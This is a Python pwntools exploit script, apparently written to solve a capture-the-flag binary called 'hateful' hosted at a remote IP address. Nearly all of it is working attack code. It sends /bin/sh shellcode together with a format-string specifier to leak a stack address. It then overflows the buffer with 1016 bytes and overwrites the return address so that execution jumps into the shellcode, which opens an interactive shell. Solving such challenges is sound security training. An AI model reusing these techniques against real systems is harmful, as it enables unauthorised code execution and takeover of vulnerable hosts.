#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template hateful
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'hateful')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR

# Use the specified remote libc version unless explicitly told to use the
# local system version with the `LOCAL_LIBC` argument.
# ./exploit.py LOCAL LOCAL_LIBC
if args.LOCAL_LIBC:
    libc = exe.libc
else:
    library_path = libcdb.download_libraries('libc.so.6')
    if library_path:
        exe = context.binary = ELF.patch_custom_libraries(exe.path, library_path)
        libc = exe.libc
    else:
        libc = ELF('libc.so.6')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Partial RELRO
# Stack:      No canary found
# NX:         NX enabled
# PIE:        No PIE (0x400000)
# Stripped:   No

# io = start()
io = remote("52.59.124.14",5020)

shellcode1 = asm(shellcraft.sh())
shellcode2 = b'H\xb8/bin/sh\x00PT_1\xc0P\xb0;TZT^\x0f\x05'
# second shellcode dosent work as \x00 gets sent as the end
shellcode = shellcode1

io.recvuntil(b">> ")
io.sendline(b"yay")

io.recvuntil(b">> ")
io.sendline(shellcode+b"%p")

io.recvuntil(b"email provided: ")
print("Shellcode that we sent    :",shellcode)
print("Shellcode that it recieved:",io.recv(len(shellcode)))

leaked_mem_addr = io.recvuntil(b'\n')[:-1]
print("Memory aderss we got",leaked_mem_addr)
leaked_mem_addr = int(leaked_mem_addr,16)

payload = b""
payload += b"A"*(1016)
# payload += p64(0x00401359)
payload += p64(leaked_mem_addr + len(shellcode))

io.recvuntil(b"now please provide the message!\n")
io.sendline(payload)

io.interactive()